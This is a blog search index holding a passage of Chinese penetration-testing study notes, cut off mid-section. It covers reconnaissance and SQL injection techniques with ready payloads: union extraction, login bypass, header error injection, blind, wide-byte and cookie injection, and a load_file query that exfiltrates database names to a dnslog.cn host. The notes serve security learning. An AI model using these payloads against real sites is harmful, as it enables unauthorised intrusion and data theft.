<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>渗透测试总结</title>
      <link href="/2020/07/26/shen-tou-ce-shi-zong-jie/"/>
      <url>/2020/07/26/shen-tou-ce-shi-zong-jie/</url>
      
        <content type="html"><![CDATA[<h1 id="掌控安全Web安全所学总结"><a href="#掌控安全Web安全所学总结" class="headerlink" title="掌控安全Web安全所学总结"></a>掌控安全Web安全所学总结</h1><p>从掌控安全学习web渗透入门，到现在还一直没有总结过所学知识，虽然有写笔记，但是还是觉得知识有些零散，使用起来不是那么得心应手，我想，再把那些知识复习总结一下会好很多。</p><p>持续更新中~</p><p>在这里声明一下，以下知识是按照MySQL数据库和PHP来讲解的，但是原理都一样，其他的数据库和其他的语言出问题的地方也都存在相似之处。</p><h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><h3 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h3><p>判断字符串是否符合某一规则（判断是否符合手机号，邮箱规则）</p><p>从一个字符串中找出符合规则的所有字符串（取HTML标签名）</p><h3 id="标识"><a href="#标识" class="headerlink" title="标识"></a>标识</h3><p>PHP中使用正则规则而一定要加代表正则的标识    <strong>/ /</strong></p><h3 id="常用正则函数"><a href="#常用正则函数" class="headerlink" title="常用正则函数"></a>常用正则函数</h3><p>preg_match_all(正则表达式,匹配字符串,匹配到的东西放入数组)</p><p>​    返回匹配到的次数</p><p>preg_replace(正则表达式,替换成什么,匹配字符串)</p><p>​    返回替换后的结果</p><h3 id="常用转义字符"><a href="#常用转义字符" class="headerlink" title="常用转义字符"></a>常用转义字符</h3><p>数字：\d</p><p>非数字：\D</p><p>空白字符(空格、制表符 、换页符等)：\s</p><p>非空白符：\S</p><p>单词字符(26个英文字母+数字+下划线)：\w</p><p>非单词字符：\W</p><h3 id="自定义字符"><a href="#自定义字符" class="headerlink" title="自定义字符"></a>自定义字符</h3><p>字符集合：[单个字符或字符区间]，用于匹配集合内字符</p><p>如：</p><p>​        [a-z]：表示a-z这26个小写字母；</p><p>​        [0-9a-z]：表示0-9和a-z；</p><p>​        [135a-h]：表示包含数字1,3,5和字母a-h这8个字母。</p><p><strong>注意：两个不同字符段之间请勿使用,隔开</strong></p><p>非集：[^单个字符或字符串之间]，用于匹配非集合内字符</p><p>如：</p><p>​        [^0-9]：表示匹配所有非数字字符；</p><p>​        [^a-zA-Z]：表示匹配所有有非字母字符。</p><h3 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h3><p>()：代表这是一个整体；</p><p>^：匹配输入字符串的开始位置；</p><p>$：匹配输入字符串的结尾位置；</p><p>.：通配符[代表任意字符] [不匹配换行]；</p><p>*：匹配0次或多次；</p><p>+：匹配1次或多次；</p><p>\：转义字符；</p><p>|：两项之间的一个选择。</p><h3 id="限定符"><a href="#限定符" class="headerlink" title="限定符"></a>限定符</h3><p>{n}：如0{8}：指只有连起来的8个0才会被匹配；</p><p>{n,}：如0{2,}：指只要有2个0及其以上就匹配；</p><p>{n,m}：如0{2,4}：指最少匹配2个0，最多匹配4个0。</p><p><strong>注意：被匹配时，默认匹配最多的次数</strong></p><h3 id="修饰符"><a href="#修饰符" class="headerlink" title="修饰符"></a>修饰符</h3><p>/i:不区分大小写；</p><p>/A：匹配规则必须从头开始匹配；</p><p>/s：将匹配一切字符；</p><p>/x：正则表达式中的空白字符会被忽略。</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="信息收集收集什么？"><a href="#信息收集收集什么？" class="headerlink" title="信息收集收集什么？"></a>信息收集收集什么？</h3><ol><li>whois信息</li></ol><p>whois指的是域名注册时留下的信息，比如留下管理员的名字、电话号码、邮箱。</p><ol start="2"><li>子域名（包括具有功能的IP）</li></ol><p>顶级域名下的二级域名或者三级甚至更多级的域名都属于子域名</p><p>子域名可以扩大攻击范围，同一域名下的二级域名都属于相同资产，一般而言都有相关的联系。</p><ol start="3"><li>端口探测</li></ol><p>有些危险端口开放了我们就可以尝试入侵，例如445|3306|22|1433|6379 可以尝试爆破或者是使用某些存在漏洞的服务。而且有可能一台服务器上面不同端口代表着不同的web网站~ </p><p>常用工具为Nmap。</p><ol start="4"><li>旁站（同ip网站）</li></ol><p>旁站指的是在同一ip上面的多个网站，如果你成功拿下旁站，运气好和主站在同一台机器上，是不是就拿到了主站？入伙运气不好是一个内网，我我们是不是可以尝试内网渗透？</p><ol start="5"><li>C段 </li></ol><p>例如192.168.1.1，那么192.168.1.1-192.168.1.255都属于同一C段，有些学校或者大公司，他们会持有整个IP段，这个ip 段中所有的ip都是那个公司的资产，拿下一台可能有用的信息，可能在同一内网。</p><ol start="6"><li>目录扫描</li></ol><p>有些网站可能某个目录下是一个新的网站，有的时候目录扫描直接下载了压缩包遇难、编辑器目录、一些废弃的页面（会报错）。</p><p>常用工具为御剑。</p><ol start="7"><li>指纹识别</li></ol><p>cms可能存在通杀漏洞，如果使用了CMS建站我们可以用通杀漏洞直接攻击。</p><ol start="8"><li>内容敏感信息泄露（google hacking）</li></ol><p>尝试Google语法，站到 某些敏感内容，比如包含身份证号码的表格、包含服务器账号密码的文件、某些敏感文件、备份数据库。</p><p>还有一种网络空间搜索引擎的东西，基于物联网搜索，搜索联网的网络设备，例如：钟馗之眼、Shodan、fofa。</p><p>通过网络空间搜索引擎，我们能够找到开放的服务以及在线的网络设备</p><h3 id="信息收集的方法"><a href="#信息收集的方法" class="headerlink" title="信息收集的方法"></a>信息收集的方法</h3><ol><li>whois信息</li></ol><p>站长工具查询：whois.chinaz.com</p><p>国外查询：whois.com</p><ol start="2"><li>端口</li></ol><p>nmap -o 192.168.1.1(kali自带nmap)</p><p>还有一种在线扫描网站：<a href="https://www.atool99.com/port_scanner.php" target="_blank" rel="noopener">https://www.atool99.com/port_scanner.php</a></p><ol start="3"><li>旁站</li></ol><p>站长工具查询：s.tool.chinaz.com/same</p><p>​                            phpinfo.me/bing.php</p><ol start="4"><li>C段</li></ol><p>确定ip的范围，然后对端内的ip主机进行信息收集</p><ol start="5"><li>目录扫描</li></ol><p>可以使用御剑等工具进行扫描（查看robots.txt信息）</p><ol start="6"><li>指纹识别</li></ol><p>云悉、微步社区</p><ol start="7"><li>内容敏感信息泄露</li></ol><p>各种包含敏感信息的东西（google语法）</p><p>不翻墙的可以使用镜像站：</p><p>c.g456.top</p><p>gm1.xueyanren.com</p><p>hp.myway.com/myway/index.html</p><p>fireball.com</p><ol start="8"><li>子域名</li></ol><p>通过google  hack语法进行查询（爬取搜索引擎）</p><p>通过某些平台（微步社区 云悉）</p><p>使用工具爆破DNS服务器（SubBrute、Knockpy  github有下载） 泛解析（没有设置过的解析）</p><p>网页内蜘蛛爬虫    </p><h3 id="Google-Hacking"><a href="#Google-Hacking" class="headerlink" title="Google Hacking"></a>Google Hacking</h3><table><thead><tr><th>关键字</th><th>功能</th></tr></thead><tbody><tr><td>“”</td><td>双引号内的内容不可拆分</td></tr><tr><td>site:</td><td>指定域名</td></tr><tr><td>inurl:</td><td>url存在关键字的网页</td></tr><tr><td>intext</td><td>网页正文中的关键字</td></tr><tr><td>filetype</td><td>指定文件类型</td></tr><tr><td>intitle</td><td>网页标题中的关键字</td></tr><tr><td>link</td><td>link:baidu.com  表示所有和biadu.com做了连接的url</td></tr><tr><td>info</td><td>查找指定站点的一些基本信息</td></tr></tbody></table><p>这里只是列举出一些简单的用法，详细的谷歌语法百度就可以学到</p><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><h4 id="端口状态："><a href="#端口状态：" class="headerlink" title="端口状态："></a>端口状态：</h4><p>在信息收集中，目标副武器的端口状态也是我们要留意的</p><p>open(开放的)</p><p>close(关闭的)</p><p>Filtered(被过滤的)</p><p>unfiltered(未被过滤的)</p><p>open|filtered(开放或被过滤的)</p><p>closed|filtered(关闭或被过滤的)</p><h4 id="查端口方法："><a href="#查端口方法：" class="headerlink" title="查端口方法："></a>查端口方法：</h4><p>​    nmap -p  80,22   url/ip                自定义想要扫描的端口</p><p>​    nmap -P  1-255    url/ip                自定义端口范围</p><p>​    nmap  -r    url/ip                            随机扫描端口</p><h4 id="端口类型："><a href="#端口类型：" class="headerlink" title="端口类型："></a>端口类型：</h4><p>周知端口：0-1023</p><p>动态端口：49152-65535</p><p>注册端口：1024-49151</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>子域名的挖掘的意义在于扩大资产，渗透测试的话很可能测试一个域名，自住哪也都是测试范围，我们可以从子站中获得信息，或者拿到子站权限，对主网进行内网渗透。</p><p>对于一些网站，他的主站采用CDN加速，但是他的子站可能没有，因此，也可以从子站查询真实ip</p><p>whois查询到的信息可用来社工或者根据邮箱手机号进行密码组合用以爆破</p><p>目标的真实ip也许会对我们的渗透测试提供很多便利</p><h2 id="SQL注入原理分析"><a href="#SQL注入原理分析" class="headerlink" title="SQL注入原理分析"></a>SQL注入原理分析</h2><h3 id="注入的本质："><a href="#注入的本质：" class="headerlink" title="注入的本质："></a>注入的本质：</h3><p>把用户输入的数据当作代码执行。</p><p>这里要满足两个条件：</p><ol><li><p>用户能控制输入</p></li><li><p>原本程序要执行的代码，拼接了用户输入的数据然后进行执行</p></li></ol><h3 id="显错注入——联合查询："><a href="#显错注入——联合查询：" class="headerlink" title="显错注入——联合查询："></a>显错注入——联合查询：</h3><h4 id="1、判断注入点"><a href="#1、判断注入点" class="headerlink" title="1、判断注入点"></a>1、判断注入点</h4><p>最古老的方法：</p><p>​        and 1=1   页面显示正常</p><p>​        and 1=2    页面显示不正常</p><p>最简单的方法：</p><p>​        传参后面加’，看是否报错</p><p>若为数字型传参，可以用-1</p><p>例如：</p><p><a href="http://www.xxx.com/new.php?id=1" target="_blank" rel="noopener">http://www.xxx.com/new.php?id=1</a>            页面显示id=1的新闻</p><p><a href="http://www.xxx.com/new.php?id=2-1" target="_blank" rel="noopener">http://www.xxx.com/new.php?id=2-1</a>        页面显示id=1的新闻</p><p>只要发生上面的这些情况的，就是存在SQL注入漏洞。</p><p>一般来说and 1=1和and 1=2被拦截的可能性太高了，可以尝试一下and -1=-1;and -1=-2;and 1&gt;0 or 1=1</p><p>或者直接尝试or sleep(5)            让页面延迟5秒显示</p><p><strong>其目的就是为了判断我们输入的东西是否被当做了代码来执行了</strong>。</p><h4 id="2、判断字段数"><a href="#2、判断字段数" class="headerlink" title="2、判断字段数"></a>2、判断字段数</h4><p>如何知道表里面的字段数，就用:</p><p>order    by    1        以第1个字段进行排序</p><p>order    by    2        以第2个字段进行排序</p><p>……</p><p>例如，当order    by    3    输进去之后，页面显示不正常了，那么显示这个页面的这张表就只有两个字段。</p><h4 id="3、判断输出点"><a href="#3、判断输出点" class="headerlink" title="3、判断输出点"></a>3、判断输出点</h4><p>select    1,2            输出第1和第2个字段</p><p>这个就是用来判断在这个页面中存在sql注入的显错点在哪，只有找到了显错点，我们才能从显错点来获取数据库表中的数据。</p><p>这里假如2是输出点，那我们就可以用database()这个函数来获取数据库的库名</p><pre><code>select    1,database()</code></pre><br><p>获取数据库常规写法：</p><p>​    select    字段名    from    表名    where    条件</p><p>那么我们知道了库名之后，要怎么获取字段名和表名呢，这里有两个方法</p><p>①.猜，常用的字段名和表名</p><p>②.在mysql中高于5.0版本的有一个系统自带库information_schema，这个库中有两张表，分别是：</p><p><strong>information_schema.tables</strong>                存放表名和库的对应的表</p><p><strong>information_schema.columns</strong>            存放字段名和表名的对应</p><h4 id="4、去系统自带库的表中查表名、字段名"><a href="#4、去系统自带库的表中查表名、字段名" class="headerlink" title="4、去系统自带库的表中查表名、字段名"></a>4、去系统自带库的表中查表名、字段名</h4><p>查表名，例：</p><pre><code>url    and    1=2    union    select    1,table_name    from    infomation_schema.tables    where    table_schema=database()    limit    0,1</code></pre><p>用limit    0,1；limit    1,1;limit    2,1 这样来一个一个的显示表名</p><p>查字段名，例：</p><pre><code>url    and    1=2    union    select    1,column_name    from    information_schema.columns    where        table_schema=database()    and    table_name='刚刚查到的表名'    limit    0,1</code></pre><p>这里也同样用limit    1,1    2,1来着查看字段名</p><br><p>遇到字符型传参，如id=1’1’</p><p>加上’%23或者’–+</p><p>其主要目的就是闭合单引号，当然也有可能别人用的是双引号，这个要自己尝试，因为他不会显示出来</p><p>出现小括号也是一样的，如id=(‘1’)</p><p>用’)来闭合它，再加上%23或者–+来闭合</p><br><p>最后，查到了我们想要的表名和字段名,就可以一个个查字段中的数据了</p><pre><code>union    select        1,字段名    from    表名    limit 0,1</code></pre><h2 id="渗透测试常用工具"><a href="#渗透测试常用工具" class="headerlink" title="渗透测试常用工具"></a>渗透测试常用工具</h2><h3 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h3><p>安装python2.7.16环境，设置环境变量：此电脑右键-&gt;属性-&gt;高级系统设置-&gt;高级-&gt;环境变量-&gt;path-&gt;编辑-&gt;新建-&gt;将python的安装路径加进去。</p><p>在安装sqlmap的文件夹里cmd，然后python  sqlmap.py就可以使用了</p><br><p>sqlmap基础命令：</p><p>-u：指定注入点（url）</p><p>-dbs：跑库名</p><p>–tables：跑表名</p><p>–columns：跑字段名</p><p>–dump：枚举数据</p><p>-D：指定库</p><p>-T：指定表</p><p>-C：指定字段</p><p>–random-agent：选择随机的user-agents头</p><p>–delay=1：每次探测延时1秒（防止访问过快被ban）</p><p>–count：查看数据量</p><p>–proxy  “<a href="http://127.0.0.1:1080&quot;：使用本地1080端口" target="_blank" rel="noopener">http://127.0.0.1:1080"：使用本地1080端口</a></p><p>–level   1-5：测试等级（最低1，最高5），level等级越高检测越详细，例如：level 2会检测cookie注入，大于3检测头注入</p><p>–is-dba：查询当前用户权限，如果dba是True可以尝试直接拿webshell</p><p>–os-shell：尝试往网站中放热一个cmd  shell（就是拥有cmd权限的shell），先选择写入shell的脚本语言，有的需要填写网站的web目录的绝对路径，有的可以直接选择好的shell的脚本语言类型就可以拿shell。</p><h3 id="Burp-Suite"><a href="#Burp-Suite" class="headerlink" title="Burp Suite"></a>Burp Suite</h3><p>首先安装java环境</p><p>原理：中间人工具</p><p>谷歌浏览器插件安装方法：</p><p>把proxy swithchysharp.crx文件改为zip文件，解压到一个文件夹内，然后拖入浏览器的扩展程序页面中</p><p>点浏览器右上角出现的小地球，点选项，情节模式名称随便起一个名字，http代理设置为127.0.0.1，8080，不代理的地址删掉，保存即可</p><p>要抓包，就打开代理，然后打开burp就可以了</p><h2 id="POST注入与Head注入"><a href="#POST注入与Head注入" class="headerlink" title="POST注入与Head注入"></a>POST注入与Head注入</h2><h3 id="POST注入"><a href="#POST注入" class="headerlink" title="POST注入"></a>POST注入</h3><p>post注入就是在一些登录框、查询框等各种和数据库有交互的框中进行的注入</p><p>get传参是通过”?”来标识的，get传参会经过url编码，数据量有限，比较少</p><p>post传参的数据可以比较大，post注入本质和get注入无区别</p><br><p>一般我们会先尝试万能密码：admin或123465或’ or 1=1 #</p><p>假如我们直接在要输入账号的框中输入a’ or 1=1，然后用burp抓包查看的话，我们很有可能看到类似于这样的语句</p><pre><code>select from user where username='a' or 1=1 #' and password=''</code></pre><p>常规的post注入就是</p><pre><code>a' or 1=1 order by 1a' union select 1,2,3#a' union select 1,2,database()#</code></pre><p>然后其他的就跟get注入一模一样</p><p>如果#被过滤，就用–+/– qwe，还被过滤就用\*</p><br><p>用sqlmap跑post注入</p><pre><code>python sqlmap.py -u url --form</code></pre><p>也可以用burp抓一个包，然后复制下来，放在sqlmap工具的文件夹下的1.txt文件中，在username=……后面加上*，password=…后面也可以加，sqlmap就会自动替换username和password的字段的内容</p><pre><code>python sqlmap.py -r 1.txt --level 3</code></pre><h3 id="Head注入"><a href="#Head注入" class="headerlink" title="Head注入"></a>Head注入</h3><p>PHP全局变量——超全局变量</p><p>HTTP开头的传参量都是可以有我们自己决定的，甚至可以在包中输入自己的东西</p><p>有获取就很容易有存储</p><p>我们想一下insert into () [插入页面会不会有输出]</p><p>我们可以通过两种方法来做：盲注和报错注入</p><p>这里我们用报错注入来讲</p><br><p>致命性报错：</p><p>​    updatexml()：更新xml文档的函数</p><p>​        语法：updatexml(目标xml内容，xml文档路径，更新的内容)</p><p>​        例：</p><pre><code>updatexml(123,concat('~',(select database())),123)</code></pre><p>concat()：拼接字符串</p><p>如果不行，也可以尝试下用0x7e代替~，因为数据库是支持16进制的，而且通常单引号会被过滤</p><br><p>既然head注入是用在请求头中的，那么我们就用burp抓一个包，然后在数据包里的一些请求头中假如上面的注入语句</p><p>例如在User-Agent的数据后面加上</p><pre><code>'or updatexml(1,concat(0x7e,(select database())),1),1)#</code></pre><p>用and的时候，前面的错了，则后面的不执行；前面的对了，则后面的执行；</p><p>用or的时候，前面的对了，则后面的不执行；前面的错了，则后面的执行；</p><p>所以，如果用or不行，就换and。</p><p>报错注入要一个字段一个字段的拿</p><h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>盲注就是服务器无回显的时候完成的注入攻击</p><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><p>盲注分为布尔盲注和时间盲注，</p><p>布尔盲注就是True和Flase；</p><p>时间盲注就是页面返回值只有一种，true，无论输入任何值，返回情况都会按照正常的来处理。</p><h3 id="需要认识的函数"><a href="#需要认识的函数" class="headerlink" title="需要认识的函数"></a>需要认识的函数</h3><p>length()：返回字符串的长度；</p><p>substr()：截取字符串；（语法    substr(str,pos,len);    pos代表从哪里开始截取）</p><p>ascii()：返回字符串的ascii码;；</p><p>sleep()：将程序挂起n秒；</p><p>if(exp1,exp2,exp3)：判断语句，如果第一个语句正确就执行第二个语句，如果错误则执行第三个语句。</p> <br><p>示例：</p><pre><code>and length(database())&gt;12 #如果页面正常，则数据库名有12个字符and substr(database(),1,1)=1 #可以用burp进行爆破，替换a，显示正常则字符正确，第一个正确了，就测试第二个，然后第三个......and ascii(substr(database(),1,1))&gt;100 #用字符的ASCII码来缩小查找范围ascii(substr((select table_name from information_schema.tables=database( limit 0,1),1,1)))=102 #    更换1,1中的前面的那个1和102来判断表名</code></pre><p>数据库名、表名、字段名都可以按照这个方法来判断</p><h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>magic_quotes_gpc：魔术引号开关，在php中的作用是判断用户提交的数据，如包含有：post、get、cookie、过来的数据增加转义字符“\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染，而出现致命的错误。</p><p>出现魔术引号的时候，会经过PHP处理出现’或者”或者\导致我们输入的东西无法闭合</p><p>这时候我们就需要寻找不需要闭合的注入点或者使用宽字节注入</p><br><p>这里我们要知道一个编码格式：GBK编码，是一种多字符编码，双字节编码</p><p>而且，当汉字是GBK编码的时候是两个字节，是UTF-8表面的的时候是3个字节。</p><p>我们可以用汉子来吧魔术引号的\屏蔽掉，相当于是一种绕过</p><p>当我们遇到的是GET传参的时候，就用GBK编码来代表汉字，例</p><pre><code>id=1 %5d%5c' union select 1,2,3 -- qwe假如说我们这个时候已经获取了数据库名，那么就将数据库名转换为16进制数id=1 %5d%5c' union select 1,2,table_name from information_schema tables where table_shcema=0x76738572因为MySQL是支持十六进制的，我们如果直接输入数据库名的话，要加单引号，而单引号会被魔术引号注释掉，导致失效，而直接用database()来代替数据库名可能会出错</code></pre><p>当我们遇到是POST传参的时候，直接输入汉字进行绕过即可，其余与GET传参无异</p><p>同时也可以</p><pre><code>a') or 1=1 -- qwe也可以用burp在hex中把a所代表的那个十六进制改成df来进行绕过</code></pre><h2 id="Access注入——cookie注入"><a href="#Access注入——cookie注入" class="headerlink" title="Access注入——cookie注入"></a>Access注入——cookie注入</h2><h3 id="什么是Cookie？"><a href="#什么是Cookie？" class="headerlink" title="什么是Cookie？"></a>什么是Cookie？</h3><p>cookie就是代表你身份的一串字符串，网站根据Cookie来识别你是谁，如果你获取了管理员的Cookie，你可以无需密码直接登录管理员账号。</p><h3 id="为什么Cookie和注入擦出火花？"><a href="#为什么Cookie和注入擦出火花？" class="headerlink" title="为什么Cookie和注入擦出火花？"></a>为什么Cookie和注入擦出火花？</h3><p>在动态语言中存在超全局变量可以获取多种传参方式，很多时候开发在开发的时候为了考虑到多种接收参数，在接收参数的时候都用多种解释传参的方式。</p><p>例如：php中的$_REQUEST可以获取POST|GET|COOKIE传参</p><p><strong>php5.4以上版本不接受Cookie传参</strong></p><br><p>Cookie注入不仅仅存在于Access数据库中，其他数据库中也有；</p><p><strong>Cookie注入是在POST，GET传参被拦截的情况下所使用的</strong></p><h3 id="实现Cookie注入要满足的条件："><a href="#实现Cookie注入要满足的条件：" class="headerlink" title="实现Cookie注入要满足的条件："></a>实现Cookie注入要满足的条件：</h3><p>1、注入满足的条件；</p><p>2、网站会获取Cookie传参，然后和原有的SQL语句拼接再传入数据库。</p><h3 id="设置Cookie的方法："><a href="#设置Cookie的方法：" class="headerlink" title="设置Cookie的方法："></a>设置Cookie的方法：</h3><h4 id="一、用Burp"><a href="#一、用Burp" class="headerlink" title="一、用Burp"></a>一、用Burp</h4><p>找到包中Cookie传参的那一行，在Cookie中的数据后面加上分号，然后进行传参</p><p>例：我们抓取了一个网站的新闻页面的包，id传参为171，将url栏中的?id=171去掉，然后Cookie:……….; id=171</p><h4 id="二、浏览器插件EditCookie"><a href="#二、浏览器插件EditCookie" class="headerlink" title="二、浏览器插件EditCookie"></a>二、浏览器插件EditCookie</h4><p><strong>Cookie的传参会进行url解码，所以传参的时候不要忘记进行url编码</strong></p><p>其次Cookie注入和sql注入没有区别</p><p>查询Access数据库必须要带表名，而且Access数据库没有系统自带库，所以就要强行蔡姐来猜测表名</p><pre><code>and exists(select *from 表名)        #不要忘记进行url编码</code></pre><p>这段代码可以判断数据库中是否存在此表，显示正常则代表存在。</p><p>我们可以用burp来爆破表名</p><p>假如我们已经获得了表名为admin，并且判断出表中有三个字段</p><p>那么就要判断输出点，用EditCookie新建一个cookie，命名为id，内容为</p><pre><code>171 union select 1,2,3 from admin        #不要忘记进行url编码</code></pre><p>判断完输出点，这个时候我们就要得到字段名来获得数据，这里有两个方法获取字段名：①、强猜；②、偏移注入</p><p>偏移注入后面就会讲，这里用强猜，常用的字段名都可以尝试，例如username;password;id…….</p><pre><code>171 union select 1,username,3 from admin        #不要忘记进行url编码171 union select 1,password,3 from admin</code></pre><h4 id="三、用js设置Cookie"><a href="#三、用js设置Cookie" class="headerlink" title="三、用js设置Cookie"></a>三、用js设置Cookie</h4><p>F12打开Console，我们用浏览器的控制台的时候记得要把插件关掉</p><p>用js来进行SQL注入的话我们就不需要进行url编码了</p><p>进入Console后直接输入</p><pre><code>document.cookie="id="+escape("171 order by 1")</code></pre><p>记得要把URL栏中的?id=171删掉，只要替换括号内的语句就可以了</p><br><p>我们用SQLmap跑cookie注入的时候</p><pre><code>python sqlmap.py -u .......?id=171(这个?id=171记得要删掉) --cookie "id=171" --level 2</code></pre><p>Cookie注入一般在ASP站中容易遇到，因为这样的站都是一些老网站，都用的是Access数据库。</p><h2 id="Access注入——偏移注入"><a href="#Access注入——偏移注入" class="headerlink" title="Access注入——偏移注入"></a>Access注入——偏移注入</h2><h3 id="偏移注入使用场景："><a href="#偏移注入使用场景：" class="headerlink" title="偏移注入使用场景："></a>偏移注入使用场景：</h3><p>在知道表名但不知道字段名的情况下查询数据，搭配cookie注入</p><h3 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h3><p><em>：在数据库中\</em>代表一切</p><p>库.表：表示选中这个库里面这个表</p><p>admin.*：代表admin表中所有字段</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/07/26/shen-tou-ce-shi-zong-jie/1.png" alt=""></p><p>假如我们要注入的这个页面，用order by 查到显示这个页面的表中有10个字段，然后知道了有一个叫admin的表，如果这个admin表中有2个字段，那么就要用</p><pre><code>union select 1,admin.*,4,5,6,7,8,9,10 from admin</code></pre><p>假设admin表中有7个字段=&gt;a,b,c,d,e,f,g</p><pre><code>union select 1,2,3,4,5,6,7,8,9,10 from admin        #正常这样判断显错位union select 1,2,3,admin.* from admin            等价于↓union select 1,2,3,a,b,c,d,e,f,g from admin</code></pre><p>至于admin表中到底有多少个字段就要靠自己慢慢地尝试</p><p>再假设我们判断出来的显错位为4,5,6，那么</p><pre><code>select 1,2,3,admin* from admin        #可以获得a,b,cselect 1,2,admin* from admin        #可以获得b,c,dselect 1,admin*,9,10 from admin        #可以获得c,d,eselect admin.*,8,9,10 from admin    #可以获得d,e,f</code></pre><p>偏移注入就是有这样的局限性，因为显错位不够，导致g无法显示了，如果原本要查询的这个页面的数据库中的表的字段越多，显示位越多，偏移注入就越多，当然可能并不是所有的字段内容都是对我们有用的。</p><p>有的显错位并不一定那么明显的显示在页面中，有可能在这个页面的图片中的html源码里</p><p>偏移注入用sqlmap是跑不出来的，所以遇到了还是自己手注的好</p><h2 id="MySQL注入——DNS注入"><a href="#MySQL注入——DNS注入" class="headerlink" title="MySQL注入——DNS注入"></a>MySQL注入——DNS注入</h2><p>Dns log【Dns日志注入】</p><h3 id="Dns-Log使用场景："><a href="#Dns-Log使用场景：" class="headerlink" title="Dns Log使用场景："></a>Dns Log使用场景：</h3><p>在某些无法直接利用漏洞获得回显的情况下，但是目标可以发起请求，这儿是后可以通过DNS请求把想获得的数据外带出来。对于sql盲注，常用的方法就是二分法去一个个猜，但是这样的方法麻烦不说，还很容易因为数据请求频繁导致被ban。所以可以将select到的数据发送给一个url，利用dns解析产生的记录日志来查看数据。</p><h3 id="DNS日志的作用："><a href="#DNS日志的作用：" class="headerlink" title="DNS日志的作用："></a>DNS日志的作用：</h3><p>是因为网站没有回显点，只能用盲注的方法，可能盲注都做不了，ton故宫这种外在的方法来显示。</p><p>核心：将盲注转换成显错注入</p><br><p>LOAD_FILE()：读取文件的函数，仅限于MySQL数据库</p><p>读取文件并返回文件内容为字符串，要使用此函数，<strong>文件必须位于服务器主机上</strong>，必须指定完整路径的文件，并且必须有FILE权限。该文件所有字节可读，但文件内容必须小于max_allowed_packet（限制server接收的数据包大小函数，默认1MB）。如果该文件不存在或无法读取，因为前面的条件之一不满足，函数返回NULL</p><p><strong>默认情况下，load_file()函数是不支持的，需要修改MySQL文件夹下的my.ini文件，在文件最后一行加上secure_file_priv=</strong></p><p>有些开发而可能会偷懒采用这个方法来加载一些外部文件，才会开启它。</p><h3 id="UNC路径："><a href="#UNC路径：" class="headerlink" title="UNC路径："></a>UNC路径：</h3><p>就像是NFS共享文件夹那样要输入的</p><p>\\192.168.1.1</p><p>DNS注入时因为转义的原因，反斜杠可能要写4个，所以正斜杠会更好//192.168.1.1</p><br><p>UNC路径其实是windows有个叫SMB的服务，我们控制它去请求一些数据</p><p>例：//a.1806dl.dnslog.cn/abc</p><p>访问1806dl.dnslog.cn下的abc共享文件夹</p><p>Linux系统默认没有smb服务，</p><p>这个域名一定是他公司内网所解析不了的</p><br><p>dnslog.cn平台可以帮助我们随机获取一个域名，在这个平台就可以显示我们想要的dns日志</p><p>例：</p><pre><code>and load_file(concat('//',(select database()),'3u501d.dnslog.cn//abc')) -- qwe</code></pre><p>3u501d.dnslog.cn是在dnslog.cn平台随机获取的域名，abc是要查的文件夹，写什么都可以，上面这条语句可以帮助我们获得库名</p><pre><code>and load_file(concat('//',(select table_name from information_schema.tables where table_schema=database() limit 0,1),'3u501d.dnslog.cn//abc')) -- qwe</code></pre><p>通过GET传参或者其他什么传参都可以</p><h2 id="MSSQL注入——反弹注入"><a href="#MSSQL注入——反弹注入" class="headerlink" title="MSSQL注入——反弹注入"></a>MSSQL注入——反弹注入</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>MSSQL注入攻击是最为复杂的数据库攻击技术，由于该数据库功能十分强大，存储过程以及函数语句十分丰富，这些灵活的语句造就了新颖独特的攻击思路。</p><h3 id="MSSQL反弹注入"><a href="#MSSQL反弹注入" class="headerlink" title="MSSQL反弹注入"></a>MSSQL反弹注入</h3><p>明明是SQL的注射点却无法进行注入，注入工具猜解的速度异常缓慢，错误提示信息关闭，无法返回注入结果等，这些都是在注入攻击中常常遇到的问题。为了解决以上这些疑难杂症，比较好的解决方法就是使用反弹注入技术，而反弹注入技术则需要依靠opendatasource函数支持</p><h3 id="所需要掌握的知识"><a href="#所需要掌握的知识" class="headerlink" title="所需要掌握的知识"></a>所需要掌握的知识</h3><p>反弹注入的核心就是“拖库”，将从靶场中所查询获得的信息插入到你自己的数据库中，但是拖取的表的字段数要和你要插入数据的字段数要相同。</p><ul><li>insert into：数据库插入语句；</li><li>opendatasource（provider_name,init_string）：可以理解为使用opendatasource函数将当前数据库查询的借口发送到另一个数据库服务器中；provider是注册为用于访问数据源的OLEDB提供数据库的PROGID的名称；<br>init_string为连接字符串（server=连接地址,端口;uid=用户名;database=数据库名）；</li><li>dbo：是MMSQL数据库中当前用户的权限；</li><li>堆叠注入：就是SQL注入的时候可以执行多条语句，用“;”作为一个语句的结束；</li><li>延时函数：waitfor delay ‘x:xx’：x为数字，且该语句不能单独使用，需要作为一个查询表过程中的条件；</li><li>SQL Server的系统自带表：sysobjects，且凡是用户创建的表，它的xtype都为U；</li><li>SQL Server的系统自带字段表：syscolumns，字段所对应的就是字段的id；</li><li>SQL Server强化了用户的概念，而弱化了库的概念，相当于一个用户就是一个库；</li><li>该注入需要用到Navicat来连接数据库，当然也可以用香港云中的工具来进行连接。</li></ul><h3 id="准备工作"><a href="#准备工作" class="headerlink" 